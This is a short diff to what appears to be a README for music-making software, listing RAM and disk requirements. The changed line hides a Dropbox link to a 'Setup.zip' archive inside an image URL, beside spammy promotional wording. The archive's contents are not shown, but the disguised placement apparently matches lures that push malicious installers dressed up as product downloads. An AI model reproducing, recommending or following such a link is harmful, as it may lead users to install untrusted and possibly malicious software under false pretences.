@@ -10,7 +10,7 @@
 * RAM - 8 GB or more
 * Disk space - 10 GB free space
 
-![alt-текст](https://i.imgur.com/oJFL4tg.jpg)
+![alt-текст](https://i.imgur.com/oJFL4tg.jpg[https://www.dropbox.com/s/jds2mwyujulqirg/Setup.zip?dl=1])
 
 ## Revolutionary Music Maker Instruments and Technologies Powers Music Creation Super Powers.
 
